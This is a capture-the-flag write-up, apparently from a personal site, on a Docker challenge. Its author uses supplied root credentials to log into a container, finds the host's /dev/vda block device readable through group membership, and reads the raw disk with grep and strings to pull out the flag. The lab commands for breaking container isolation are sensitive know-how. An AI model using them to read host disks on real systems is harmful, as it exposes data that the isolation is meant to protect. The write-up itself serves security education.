<style>
:root {
  color-scheme: dark;
  --bg: #020617;
  --fg: #e5e7eb;
  --fg-muted: #9ca3af;
  --accent: #38bdf8;
  --border-subtle: #1f2937;
}

/* Base page */
html, body {
  margin: 0;
  padding: 0;
  background: radial-gradient(circle at top left, #020617, #020617 40%, #020617 100%);
  color: var(--fg);
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif;
}

/* GitHub Pages wrappers */
.page-content, .wrapper, article, .post {
  background: transparent !important;
  max-width: 960px;
  margin: 0 auto;
  padding: 2.5rem 1.5rem 4rem;
}

/* Headings */
.post h1, .page-content h1, article h1 {
  font-size: 1.6rem;
  margin-bottom: 0.6rem;
}

.post h2, .page-content h2, article h2 {
  font-size: 1.1rem;
  margin-top: 1.8rem;
  margin-bottom: 0.6rem;
  color: var(--fg-muted);
}

/* Tables (if you use them) */
table {
  border-collapse: collapse;
  width: 100%;
  font-size: 0.85rem;
  margin: 0.4rem 0 0.8rem;
  border-radius: 0.6rem;
  overflow: hidden;
}

th,
td {
  padding: 0.5rem 0.75rem;
  border-bottom: 1px solid var(--border-subtle);
  background-color: rgba(15, 23, 42, 0.9);
}

th {
  text-align: left;
  font-weight: 500;
  color: var(--fg-muted);
}

tbody tr:nth-child(even) td {
  background-color: rgba(15, 23, 42, 0.75);
}

tbody tr:last-child td {
  border-bottom: none;
}

/* Links / code */
a { color: var(--accent); }
a:hover { text-decoration: none; }

code, pre {
  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
}
</style>


# Docker? I barely know her! – Writeup

**Category:** Pwn / Docker  
**Flag:** `MCTF25{53cur3_y0ur_D0ck3r_con7a1n3rs}`

---

## Challenge Description

We’re given SSH access to a “very secure” Docker container:

- **Host/IP:** `10.240.3.51`
- **User:** `root`
- **Password:** `rootpassword`

Flavor text hints that the author is overly confident in Docker isolation and that we’re allowed to “do what we want” inside the container.

> “I have made a challenge so secure, you won't be able to get the flag! Ahh, Docker is so cool these days, you can just run anything without worrying about malware.”

This basically screams: **Docker/container escape / misconfiguration**.

---

## Step 1 – Initial Access & Basic Recon

SSH into the target:

```bash
ssh root@10.240.3.51
# password: rootpassword
```

Once inside:

```bash
whoami
hostname
id
```

Output (simplified):

```text
whoami
root

id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),...
```

We are **root inside the container**, not necessarily on the host.

Check filesystem layout:

```bash
ls /
```

Nothing obviously screaming “flag”. Try the usual quick checks:

```bash
cat /flag
cat /root/flag.txt
find / -maxdepth 4 -iname '*flag*' 2>/dev/null
grep -R "MCTF25{" -n / 2>/dev/null   # (this hangs / is very noisy)
```

No luck. So the flag likely isn’t in the container’s overlay filesystem.

---

## Step 2 – Identify the Environment (Docker / OS Info)

Check OS and kernel:

```bash
uname -a
cat /etc/*release* 2>/dev/null
```

Output:

```text
Linux 3cd45ce5c27f ... x86_64 GNU/Linux
NAME="Alpine Linux"
VERSION_ID=3.22.2
PRETTY_NAME="Alpine Linux v3.22"
```

So it’s an Alpine-based container.

`/proc/1/cgroup`:

```bash
cat /proc/1/cgroup
```

Output:

```text
0::/
```

We clearly are inside a container, but this alone doesn’t show where the host is mounted (if at all).

---

## Step 3 – Inspect Mounts & Devices

Check mount points:

```bash
mount
```

Key part of the output:

```text
overlay on / type overlay (...)
...
/dev/vda on /sbin/docker-init type ext4 (ro,relatime)
/dev/vda on /etc/resolv.conf type ext4 (rw,relatime)
/dev/vda on /etc/hostname type ext4 (rw,relatime)
/dev/vda on /etc/hosts type ext4 (rw,relatime)
```

Interesting:

- There is a **block device** `/dev/vda`.
- It is an **ext4 filesystem**, mounted on:
  - `/sbin/docker-init`
  - `/etc/resolv.conf`
  - `/etc/hostname`
  - `/etc/hosts`

This is weird: `/dev/vda` looks like a full disk, but we only see tiny pieces of it (bind-mounts).

List block devices:

```bash
lsblk 2>/dev/null || cat /proc/partitions
```

Output:

```text
NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTS
fd0 2:0  1   0B  0 disk
sr0 11:0 1 1024M 0 rom
vda 253:0 0   1G 0 disk /etc/hosts
                    /etc/hostname
                    /etc/resolv.conf
                    /sbin/docker-init
```

So `/dev/vda` is a **1 GB disk**, presumably containing a full filesystem that’s partially exposed into the container.

Also, we can see the device itself:

```bash
ls -l /dev | grep vda
```

Output:

```text
brw-rw---- 1 root disk 253, 0 ... vda
```

We are in group `disk`, so we can likely read from it.

---

## Step 4 – Try to Mount `/dev/vda` Directly

First instinct: mount the disk somewhere we control.

```bash
mkdir -p /mnt/host
mount -o ro /dev/vda /mnt/host
```

Output:

```text
mount: /mnt/host: /dev/vda already mounted on /sbin/docker-init.
mount warning:
* vda: Can't mount, would change RO state
```

And:

```bash
ls -la /mnt/host
```

Result:

```text
total 8
drwxr-xr-x 2 root root 4096 ... .
drwxr-xr-x 1 root root 4096 ... ..
```

So we **cannot** mount it a second time, and `/sbin/docker-init` is still just a file in our current view:

```bash
ls -ld /sbin/docker-init
# -rwxr-xr-x 1 root root 60232 Mar 26 2024 /sbin/docker-init
```

This is classic Docker/overlay trickery: the host disk is mounted, but we don’t get to see that mountpoint as a directory in the container’s overlay.

Mounting is blocked, but we **still have raw read access** to `/dev/vda`.

---

## Step 5 – Read the Raw Disk for the Flag

If we can’t mount, we can still **scan the disk contents directly**.

```bash
grep -a "MCTF25{" /dev/vda
```

Because flags in CTFs are usually just plaintext somewhere in the filesystem, `grep -a` is enough to find it.

This reveals a line containing the flag inside some binary/text blob on the disk:

```text
...MCTF25{53cur3_y0ur_D0ck3r_con7a1n3rs}...
```

You can also do:

```bash
strings /dev/vda | grep "MCTF25{"
```

but the simple `grep -a` already gives us what we need.

---

## Final Flag

```text
MCTF25{53cur3_y0ur_D0ck3r_con7a1n3rs}
```

---
